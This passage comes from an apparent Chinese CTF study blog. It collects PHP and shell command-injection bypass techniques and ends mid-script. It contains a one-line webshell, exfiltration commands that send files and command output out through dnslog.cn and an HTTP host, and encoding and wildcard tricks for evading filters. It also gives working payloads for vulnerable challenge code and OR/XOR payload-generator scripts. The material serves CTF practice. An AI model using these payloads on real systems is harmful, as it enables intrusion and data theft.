startBuffering();</span><br><span class="line">$phar -&gt; setStub(&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);</span><br><span class="line">$phar -&gt; addFromString(&#x27;test.txt&#x27;,&#x27;&lt;?php system($_POST[1]);?&gt;&#x27;);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>生成的phar.phar里面，如果用phar协议读取(搭配文件包含)，phar:&#x2F;&#x2F;&#x2F;phar.phar&#x2F;test.txt，那么里面的代码就会被执行，phar.phar也可以是其他文件名，例如p.zip</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF知识集-命令执行</title>
      <link href="/2024/12/13/CTF%E7%9F%A5%E8%AF%86%E9%9B%86-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2024/12/13/CTF%E7%9F%A5%E8%AF%86%E9%9B%86-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF知识集-命令执行"><a href="#CTF知识集-命令执行" class="headerlink" title="CTF知识集-命令执行"></a>CTF知识集-命令执行</h1><h2 id="写在开头可能会用到的提醒"><a href="#写在开头可能会用到的提醒" class="headerlink" title="写在开头可能会用到的提醒"></a>写在开头可能会用到的提醒</h2><ul><li><p><strong>;可以用%0a来替换</strong></p></li><li><p><strong>&#96;&#96;是shell_exec的缩写</strong></p></li><li><p><strong>ls | tee 1 把ls的输出内容存入1这个文件</strong></p></li><li><p><strong>shell查看文件的几种方式，tac | more | less | tail | sort | tac | cat | head | od | expand</strong></p></li><li><p><strong>针对flag 可以用grep { flag.php来进行查看</strong></p></li><li><p><strong>遇到文件包含可以用伪协议来读取</strong></p></li><li><p><strong>遇到输出到黑洞，可以用双写绕过，ls;ls或者ls||ls或者ls%26%26ls,%26是&amp;的url编码</strong></p></li><li><p><strong>&lt;?&#x3D; 就相当于&lt;?php echo,&lt;?&#x3D;<code>ls</code>;</strong></p></li><li><p><strong>日志注入,条件：post的eval,先用ua构造一个一句话访问,日志里存在一句话了;然后用include把日志给包含住</strong></p></li><li><p><strong>存在eval(post)，可以用post去include($_GET[a]) | include “$_POST[a],a&#x3D;php伪协议</strong></p></li><li><p><strong>如果是eval(变量)，可以尝试参数逃逸，例：a&#x3D;?&gt;<?=eval($_POST[a])?></strong></p></li><li><p><strong>输出可以用print_r var_dump</strong></p></li><li><p><strong>获取文件包含的所有变量,include包含住文件,var_dump(get_defined_vars())，或者echo $变量</strong></p></li><li><p><strong>获取页面源代码，搭配eval可以用,echo file_get_contents() | show_source() | highlight_file</strong></p></li><li><p><strong>文件重命名函数rename(&#39;文件名&#39;,&#39;新文件名&#39;)，查看当前目录print_r(scandir(&#39;.&#39;))</strong></p></li><li><p><strong>利用环境变量来凑出shell命令，例如${PATH:<del>A}${PWD:</del>A}</strong></p></li><li><p><strong>linux的shell中两个单引号忽略，例如l&#39;&#39;s或者l\s或者&#39;l&#39;&#39;s&#39;,单引号会被忽略</strong></p></li><li><p><strong>linux的shell中，查看文件可以用&lt;代替空格，例如：cat&lt;flag或者cat&lt;&gt;flag</strong></p></li><li><p><strong>linux的&#x2F;bin目录下都是可以执行二进制文件，例如cat是&#x2F;bin&#x2F;cat，在一些题目可能需要用到&#x2F;bin&#x2F;cat这种</strong></p></li><li><p><strong>linux的shell的通配符,cat &#x3D; &#x2F;bin&#x2F;ca[a-z]</strong></p></li><li><p><strong>环境变量截取,在Linux下a&#x3D;ca;${a}t flag.php 等同于 cat flag.php</strong></p></li><li><p><strong>linux命令另类执行方法，$(printf “ls”) 等同于 $(printf \154\163) 都是执行ls，\154\163为八进制</strong></p></li><li><p><strong>linux的shell如果过滤空格，可以用$IFS | ${IFS} | %09| &lt; | &lt;&gt; | %0b | %0c绕过，%09是tab</strong></p></li><li><p>linux的shell如果过滤空格，可以截取环境，例如执行命令env,会出现一堆命令。Linux命令:name&#x3D;si bei;${name:2:1} 那么这样子就会出现空格,看图示例</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241212204051342.png" alt="image-20241212204051162"></p></li><li><p><strong>命令执行的另类方式,在linux的shell中<code> </code>echo bHMK|base64 -d<code> </code>这样相当于ls,以此类推，可以构造任意字符。原理<code> </code>echo ls<code> </code>这样就相当于ls,echo ls|base64 这样可以把ls给base64,然后<code> </code>echo bHMK|base64 -d<code> </code>就相当于先base64解密，变为<code> </code>echo ls<code> </code>，就相当于执行了ls</strong></p></li><li><p><strong>通过DNS通道关键信息传出来，dnslog.cn，例如curl <code>whoami` `.dnslog.cn，那么就会解析为root.dnslog.cn，可以加密payload，例如/?cmd=a=`cat flag.php|base64`;curl </code>${a:0:10}<code> </code>.dnslog.cn,这样慢慢带出来</strong></p></li><li><p><strong>通过http通道把消息带出来,例如&#x2F;?cmd&#x3D;a&#x3D;<code> </code>cat flag.php|base64<code> </code>;curl your.domin&#x2F;?a&#x3D;<code>$&#123;a:0:10&#125;</code>,然后查看网站日志，把消息带出来</strong></p></li></ul><h1 id="一些栗子"><a href="#一些栗子" class="headerlink" title="一些栗子"></a>一些栗子</h1><h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>上py脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url = &quot;http://ae1c9002-23cb-4075-abb5-f41d8b00947c.challenge.ctf.show/?c=. /???/????????[@-[]&quot;</span><br><span class="line"> </span><br><span class="line">file = &#123;</span><br><span class="line">    &quot;c&quot;: b&quot;#!/bin/sh\ncat flag.php&quot;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">req = requests.post(url=url, files=file)</span><br><span class="line">print(req.text)</span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p><strong>对环境进行强制POST上传，会将上传的东西变为文件，强制临时保存在&#x2F;tmp&#x2F;php??????目录，??????代表随机大小写字母，php代码结束后会自动删除。如果我们在强制上传文件后，执行了系统命令，去执行我们上传的文件，就可以做到命令执行，形成了条件竞争。. 在linux中代表执行,. &#x2F;???&#x2F;????????[@-[],代表去&#x2F;tmp下匹配临时文件了，最后面的[@-[]是linux的通配符，匹配a-z，可以在linux下自己试试&#x2F;bin&#x2F;ca[a-z] test.txt</strong></p><h2 id="简单过滤"><a href="#简单过滤" class="headerlink" title="简单过滤"></a>简单过滤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?c＝system(&quot;cp fla?.php 1.txt&quot;);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>利用system函数，把flag文件复制为1.txt</p><h2 id="简单过滤-1"><a href="#简单过滤-1" class="headerlink" title="简单过滤"></a>简单过滤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">$c = $_GET[&#x27;c&#x27;];</span><br><span class="line">if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;</span><br><span class="line">    eval($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?c=`cp fla?.??? 1.txt`;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>利用&#96;&#96;，把flag文件复制为1.txt</p><h2 id="参数逃逸"><a href="#参数逃逸" class="headerlink" title="参数逃逸"></a>参数逃逸</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?c=eval($_GET[a]);&amp;a=system(&quot;cp fla* 1.txt&quot;);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>参数逃逸，eval嵌套eval，GET一个参数，在新参数里面赋值</p><h2 id="复杂过滤"><a href="#复杂过滤" class="headerlink" title="复杂过滤"></a>复杂过滤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">$c = $_GET[&#x27;c&#x27;];</span><br><span class="line">if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;, $c))&#123;</span><br><span class="line">    eval($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?c=include%0a$_POST[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="思路解析"><a href="#思路解析" class="headerlink" title="思路解析"></a>思路解析</h3><p>使用include或者require包含文件，空格被过滤使用%0a来换行，分号被过滤无法闭合就使用?&gt; ,后面接前面设置的参数，使用Php伪协议，<br>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;文件名</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">$c = $_GET[&#x27;c&#x27;];</span><br><span class="line">if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">    include($c);</span><br><span class="line">    echo $flag;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php   system(&quot;cp fla?.php 1.txt&quot;);  ?&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><p>伪协议filter用不了，用data，执行函数</p><h2 id="文件包含（短连接）"><a href="#文件包含（短连接）" class="headerlink" title="文件包含（短连接）"></a>文件包含（短连接）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">$c = $_GET[&#x27;c&#x27;];</span><br><span class="line">if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123;</span><br><span class="line">    include($c);</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?c=data://text/plain,&lt;?=system(&quot;cp fla*.* 1.txt&quot;);  ?&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h3><p>把&lt;?php 换成&lt;?&#x3D;</p><h2 id="命令执行，复杂"><a href="#命令执行，复杂" class="headerlink" title="命令执行，复杂"></a>命令执行，复杂</h2><p>if(isset($_GET[&#39;c&#39;])){</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$c = $_GET[&#x27;c&#x27;];</span><br><span class="line">if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;||\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c))&#123;</span><br><span class="line">    eval($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h3><p>get ?c&#x3D;eval(array_pop(next(get_defined_vars())));<br>post a&#x3D;system(tac flag.php);</p><h3 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h3><ul><li>先print_r(get_defined_vars()); post传入a&#x3D;要执行的函数</li><li>next(print_r(get_defined_vars())); next () 函数将内部指针指向数组中的下一个元素，并输出</li><li>arrar_pop(next(print_r(get_defined_vars()))); 把数组中的值打印出来</li><li>然后eval(arrar_pop(next(print_r(get_defined_vars())))) post传入要执行的函数</li></ul><h1 id="eval扫目录脚本"><a href="#eval扫目录脚本" class="headerlink" title="eval扫目录脚本"></a>eval扫目录脚本</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c=?&gt;&lt;?php</span><br><span class="line">$a=new DirectoryIterator(&quot;glob:///*&quot;);</span><br><span class="line">foreach($a as $f)</span><br><span class="line">&#123;echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br><span class="line">?&gt;</span><br><span class="line">#记得url编码</span><br><span class="line">#在eval点进行传入</span><br></pre></td></tr></table></figure><h1 id="命令执行，或-异或-取反-自增脚本"><a href="#命令执行，或-异或-取反-自增脚本" class="headerlink" title="命令执行，或 异或 取反 自增脚本"></a>命令执行，或 异或 取反 自增脚本</h1><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$code=$_GET[&#x27;code&#x27;];</span><br><span class="line">if(preg_match(&#x27;/[a-z0-9]/i&#x27;,$code))&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">eval($code);</span><br></pre></td></tr></table></figure><h2 id="或运算生成脚本"><a href="#或运算生成脚本" class="headerlink" title="或运算生成脚本"></a>或运算生成脚本</h2><h3 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h3><p><strong>将对应的代码丢进对应的文件，放到同一个文件夹。然后php [你的php文件]，然后python [你的Py文件]</strong></p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/* php脚本*/</span><br><span class="line">/* author yu22x */</span><br><span class="line"> </span><br><span class="line">$myfile = fopen(&quot;or_rce.txt&quot;, &quot;w&quot;);</span><br><span class="line">$contents=&quot;&quot;;</span><br><span class="line">for ($i=0; $i &lt; 256; $i++) &#123; </span><br><span class="line">    for ($j=0; $j &lt;256 ; $j++) &#123; </span><br><span class="line"> </span><br><span class="line">        if($i&lt;16)&#123;</span><br><span class="line">            $hex_i=&#x27;0&#x27;.dechex($i);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $hex_i=dechex($i);</span><br><span class="line">        &#125;</span><br><span class="line">        if($j&lt;16)&#123;</span><br><span class="line">            $hex_j=&#x27;0&#x27;.dechex($j);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $hex_j=dechex($j);</span><br><span class="line">        &#125;</span><br><span class="line">        $preg = &#x27;/[0-9a-z]/i&#x27;;//根据题目给的正则表达式修改即可</span><br><span class="line">        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class="line">                    echo &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">        else&#123;</span><br><span class="line">        $a=&#x27;%&#x27;.$hex_i;</span><br><span class="line">        $b=&#x27;%&#x27;.$hex_j;</span><br><span class="line">        $c=(urldecode($a)|urldecode($b));</span><br><span class="line">        if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;</span><br><span class="line">            $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite($myfile,$contents);</span><br><span class="line">fclose($myfile);</span><br></pre></td></tr></table></figure><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># -*py脚本*-</span><br><span class="line"> </span><br><span class="line"># author yu22x</span><br><span class="line"> </span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">from sys import *</span><br><span class="line">import os</span><br><span class="line">def action(arg):</span><br><span class="line">   s1=&quot;&quot;</span><br><span class="line">   s2=&quot;&quot;</span><br><span class="line">   for i in arg:</span><br><span class="line">       f=open(&quot;or_rce.txt&quot;,&quot;r&quot;)</span><br><span class="line">       while True:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           if t==&quot;&quot;:</span><br><span class="line">               break</span><br><span class="line">           if t[0]==i:</span><br><span class="line">               #print(i)</span><br><span class="line">               s1+=t[2:5]</span><br><span class="line">               s2+=t[6:9]</span><br><span class="line">               break</span><br><span class="line">       f.close()</span><br><span class="line">   output=&quot;(&quot;+s1+&quot;|&quot;+s2+&quot;)&quot;</span><br><span class="line">   return(output)</span><br><span class="line"> </span><br><span class="line">while True:</span><br><span class="line">   param=action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot;</span><br><span class="line">   print(param)</span><br></pre></td></tr></table></figure><h2 id="异或运算生成脚本"><a href="#异或运算生成脚本" class="headerlink" title="异或运算生成脚本"></a>异或运算生成脚本</h2><h3 id="如何使用-1"><a href="#如何使用-1" class="headerlink" title="如何使用"></a>如何使用</h3><p><strong>将对应的代码丢进对应的文件，放到同一个文件夹。然后php [你的php文件]，然后python [你的Py文件]</strong></p><h3 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">/*author yu22x*/</span><br><span class="line">/*php脚本*/</span><br><span class="line"> </span><br><span class="line">$myfile = fopen(&quot;xor_rce.txt&quot;, &quot;w&quot;);</span><br><span class="line">$contents=&quot;&quot;;</span><br><span class="line">for ($i=0; $i &lt; 256; $i++) &#123; </span><br><span class="line">    for ($j=0; $j &lt;256 ; $j++) &#123; </span><br><span class="line"> </span><br><span class="line">        if($i&lt;16)&#123;</span><br><span class="line">            $hex_i=&#x27;0&#x27;.dechex($i);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $hex_i=dechex($i);</span><br><span class="line">        &#125;</span><br><span class="line">        if($j&lt;16)&#123;</span><br><span class="line">            $hex_j=&#x27;0&#x27;.dechex($j);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $hex_j=dechex($j);</span><br><span class="line">        &#125;</span><br><span class="line">        $preg = &#x27;/[a-z0-9]/i&#x27;; //根据题目给的正则表达式修改即可</span><br><span class="line">        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class="line">                    echo &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">        else&#123;</span><br><span class="line">        $a=&#x27;%&#x27;.$hex_i;</span><br><span class="line">        $b=&#x27;%&#x27;.$hex_j;</span><br><span class="line">        $c=(urldecode($a)^urldecode($b));</span><br><span class="line">        if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;</span><br><span class="line">            $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite($myfile,$contents);</span><br><span class="line">fclose($myfile);</span><br></pre></td></tr></table></figure><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># -*-这是Py脚本*-</span><br><span class="line"> </span><br><span class="line"># author yu22x</span><br><span class="line"> </span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">from sys import *</span><br><span class="line">import os</span><br><span class="line">def action(arg):</span><br><span class="line">   s1=&quot;&quot;</span><br><span class="line">   s2=&quot;&quot;</span><br><span class="line">   for i in arg:</span><br><span class="line">       f=open(&quot;xor_rce.txt&quot;,&quot;r&quot;)</span><br><span class="line">       while True:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           if t==&quot;&quot;:</span><br><span class="line">               break</span><br><span class="line">           if t[0]==i:</span><br><span class="line">               #print(i)</span><br><span class="line">               s1+=t[2:5]</span><br><span class="line">               s2+=t[6:9]</span><br><span class="line">               break</span><br><span class="line">       f.close()</span><br><span class="line">   output=&quot;(&quot;+s1+&quot;^&quot;+s2+&quot;)&quot;</span><br><span class="line">   return(output)</span><br><span class="line"> </span><br><span class="line">while True:</span><br><span class="line">   param=action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot;</span><br><span class="line">   print(param)</span><br></pre></td></tr></table></figure><h2 id="取反运算生成脚本"><a href="#取反运算生成脚本" class="headerlink" title="取反运算生成脚本"></a>取反运算生成脚本</h2><h3 id="如何使用-2"><a href="#如何使用-2" class="headerlink" title="如何使用"></a>如何使用</h3><p><strong>将对应的代码丢进对应的文件，放到同一个文件夹。然后php [你的php文件]</strong></p><h3 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td 